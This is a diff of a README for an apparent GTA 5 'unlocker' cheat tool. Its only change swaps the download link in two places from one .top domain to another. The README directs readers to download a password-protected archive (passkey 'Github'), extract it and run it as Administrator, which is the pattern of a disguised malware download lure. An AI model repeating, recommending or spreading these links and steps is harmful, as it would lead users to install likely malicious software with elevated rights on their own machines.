@@ -6,7 +6,7 @@ GTA 5 unlocker with money drop, vehicle spawner, god mode, and all unlocks for P
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular mods like **Script Hook V**, **Menyoo**, and **Kiddion's Modest
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch GTA 5.
 4. Run the unlocker **as Administrator**.
